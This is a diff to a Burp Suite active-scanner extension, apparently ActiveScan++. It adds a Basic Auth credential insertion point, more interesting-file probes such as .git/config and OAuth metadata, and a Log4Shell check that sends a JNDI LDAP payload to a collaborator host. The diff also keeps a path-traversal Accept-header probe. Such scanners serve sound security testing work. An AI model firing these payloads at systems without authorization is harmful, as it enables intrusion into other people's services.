@@ -19,6 +19,8 @@ try:
     import string
     import time
     import copy
+    import base64
+    import jarray
     import traceback
     from string import Template
     from cgi import escape
@@ -29,7 +31,7 @@ try:
 except ImportError:
     print "Failed to load dependencies. This issue may be caused by using the unstable Jython 2.7 beta."
 
-VERSION = "1.0.21"
+VERSION = "1.0.24"
 FAST_MODE = False
 DEBUG = False
 callbacks = None
@@ -58,6 +60,7 @@ class BurpExtender(IBurpExtender):
         
         callbacks.registerScannerCheck(PerHostScans())
         callbacks.registerScannerCheck(PerRequestScans())
+        callbacks.registerScannerInsertionPointProvider(BasicAuthInsertionPointProvider(callbacks))
 
         if not FAST_MODE:
             callbacks.registerScannerCheck(CodeExec())
@@ -66,6 +69,8 @@ class BurpExtender(IBurpExtender):
             callbacks.registerScannerCheck(SimpleFuzz())
             callbacks.registerScannerCheck(EdgeSideInclude())
             if collab_enabled:
+                # callbacks.registerScannerCheck(Log4j())
+                # log4j is disabled because this extension is better: https://github.com/silentsignal/burp-log4shell
                 callbacks.registerScannerCheck(Solr())
                 callbacks.registerScannerCheck(doStruts_2017_12611_scan())
 
@@ -91,18 +96,20 @@ class PerHostScans(IScannerCheck):
         return issues
 
 
-    interestingFileMappings = {
-        # relative_url: vulnerable_response_content
-
-        '/.git/config': '[core]',
-        '/server-status': 'Server uptime',
-        '/.well-known/apple-app-site-association': 'applinks',
-    }
+    interestingFileMappings = [
+        # [host-relative-url, vulnerable_response_content, reason]
+        ['/.git/config', '[core]', 'source code leak?'],
+        ['/server-status', 'Server uptime', 'debug info'],
+        ['/.well-known/apple-app-site-association', 'applinks', 'https://developer.apple.com/library/archive/documentation/General/Conceptual/AppSearch/UniversalLinks.html'],
+        ['/.well-known/openid-configuration', '"authorization_endpoint"', 'https://portswigger.net/research/hidden-oauth-attack-vectors'],
+        ['/.well-known/oauth-authorization-server', '"authorization_endpoint"', 'https://portswigger.net/research/hidden-oauth-attack-vectors'],
+        ['/users/confirmation', 'onfirmation token', 'Websites using the Devise framework often have a race condition enabling email forgery: https://portswigger.net/research/smashing-the-state-machine'],
+    ]
 
 
     def interestingFileScan(self, basePair):
         issues = []
-        for url, expect in self.interestingFileMappings.items():
+        for (url, expect, reason) in self.interestingFileMappings:
             attack = self.fetchURL(basePair, url)
             if expect in safe_bytes_to_string(attack.getResponse()):
 
@@ -113,8 +120,8 @@ class PerHostScans(IScannerCheck):
                         CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(attack).getUrl(),
                                         [attack, baseline],
                                         'Interesting response',
-                                        "The response to <b>"+html_encode(url)+"</b> contains <b>'"+html_encode(expect)+"'</b><br/><br/>This may be interesting.",
-                                        'Firm', 'High')
+                                        "The response to <b>"+html_encode(url)+"</b> contains <b>'"+html_encode(expect)+"'</b><br/><br/>This may be interesting. Here's a clue why: <b>"+html_encode(reason)+"</b>",
+                                        'Firm', 'Information')
                     )
 
 
@@ -191,8 +198,9 @@ class PerRequestScans(IScannerCheck):
 
         (ignore, req) = setHeader(basePair.getRequest(), 'Accept', '../../../../../../../../../../../../../e*c/h*s*s{{', True)
         attack = callbacks.makeHttpRequest(basePair.getHttpService(), req)
-        if '127.0.0.1' in safe_bytes_to_string(attack.getResponse()):
-
+        response = safe_bytes_to_string(attack.getResponse())
+        body_delim = '\r\n\r\n'
+        if body_delim in response and '127.0.0.1' in response.split(body_delim, 1)[1]:
             # avoid false positives caused by burp's own scanchecks containing '127.0.0.1'
             try:
                 collabLocation = callbacks.createBurpCollaboratorClientContext().getCollaboratorServerLocation()
@@ -508,7 +516,12 @@ class PerRequestScans(IScannerCheck):
                     This is a serious issue if the application is not externally accessible or uses IP-based access restrictions. Attackers can use DNS Rebinding to bypass any IP or firewall based access restrictions that may be in place, by proxying through their target's browser.<br/>
                     Note that modern web browsers' use of DNS pinning does not effectively prevent this attack. The only effective mitigation is server-side: https://bugzilla.mozilla.org/show_bug.cgi?id=689835#c13<br/><br/>
 
-                    Additionally, it may be possible to directly bypass poorly implemented access restrictions by sending a Host header of 'localhost'"""
+                    Additionally, it may be possible to directly bypass poorly implemented access restrictions by sending a Host header of 'localhost'.
+                    
+                    Resources: <br/><ul>
+                        <li>https://portswigger.net/web-security/host-header</li>
+                    </ul>
+                    """
         else:
             title = 'Host header poisoning'
             sev = 'Medium'
@@ -518,7 +531,7 @@ class PerRequestScans(IScannerCheck):
                     Depending on the configuration of the server and any intervening caching devices, it may also be possible to use this for cache poisoning attacks.<br/>
                     <br/>
                     Resources: <br/><ul>
-                        <li>http://carlos.bueno.org/2008/06/host-header-injection.html<br/></li>
+                        <li>https://portswigger.net/web-security/host-header<br/></li>
                         <li>http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html</li>
                         </ul>
             """
@@ -695,6 +708,25 @@ class doStruts_2017_12611_scan(IScannerCheck):
                 "The application appears to be vulnerable to CVE-2017-12611, enabling arbitrary code execution.  Replace the ping command in the suspicious request with system commands for a POC.",
                 'Firm', 'High')]
         return []
+
+    def doPassiveScan(self, basePair):
+        return []
+
+    def consolidateDuplicateIssues(self, existingIssue, newIssue):
+        return is_same_issue(existingIssue, newIssue)
+
+
+class Log4j(IScannerCheck):
+    def doActiveScan(self, basePair, insertionPoint):
+        collab = callbacks.createBurpCollaboratorClientContext()
+        attack = request(basePair, insertionPoint, "${jndi:ldap://"+collab.generatePayload(True)+"/a}")
+        interactions = collab.fetchAllCollaboratorInteractions()
+        if interactions:
+            return [CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
+                                    'Log4Shell (CVE-2021-44228)',
+                                    "The application appears to be running a version of log4j vulnerable to RCE. ActiveScan++ sent a reference to an external file, and received a pingback from the server.<br/><br/>" +
+                                    "To investigate, use the manual collaborator client. It may be possible to escalate this vulnerability into RCE. Please refer to https://www.lunasec.io/docs/blog/log4j-zero-day/ for further information",
+                                    'Firm', 'High')]
 
     def doPassiveScan(self, basePair):
         return []
@@ -911,6 +943,54 @@ class CustomScanIssue(IScanIssue):
 
     def getHttpService(self):
         return self.HttpService
+
+
+class BasicAuthInsertionPointProvider(IScannerInsertionPointProvider):
+    def __init__(self, callbacks):
+        self.callbacks = callbacks
+        self.doneHosts = set()
+
+    def getInsertionPoints(self, baseRequestResponse):
+        request = baseRequestResponse.getRequest()
+        requestInfo = self.callbacks.getHelpers().analyzeRequest(baseRequestResponse.getHttpService(), request)
+        for header in requestInfo.getHeaders():
+            if header.startswith("Authorization: Basic "):
+                host = requestInfo.getUrl().getHost() + ":" + str(requestInfo.getUrl().getPort())
+                if host in self.doneHosts:
+                    return []
+                else:
+                    self.doneHosts.add(host)
+                    return [BasicAuthInsertionPoint(request, 0), BasicAuthInsertionPoint(request, 1)]
+
+
+class BasicAuthInsertionPoint(IScannerInsertionPoint):
+    def __init__(self, baseRequest, position):
+        self.baseRequest = ''.join(map(chr, baseRequest))
+        self.position = position
+        match = re.search("^Authorization: Basic (.*)$", self.baseRequest, re.MULTILINE)
+        self.baseBlob = match.group(1)
+        self.baseValues = base64.b64decode(self.baseBlob).split(':')
+        self.baseOffset = self.baseRequest.index(self.baseBlob)
+
+    def getInsertionPointName(self):
+        return "BasicAuth" + ("UserName" if self.position == 0 else "Password")
+
+    def getBaseValue(self):
+        return self.baseValues[self.position]
+
+    def makeBlob(self, payload):
+        values = list(self.baseValues)
+        values[self.position] = ''.join(map(chr, payload))
+        return base64.b64encode(':'.join(values))
+
+    def buildRequest(self, payload):
+        return self.baseRequest.replace(self.baseBlob, self.makeBlob(payload))
+
+    def getPayloadOffsets(self, payload):
+        return jarray.array([self.baseOffset, self.baseOffset + len(self.makeBlob(payload))], 'i')
+
+    def getInsertionPointType(self):
+        return IScannerInsertionPoint.INS_EXTENSION_PROVIDED
 
 
 # misc utility methods
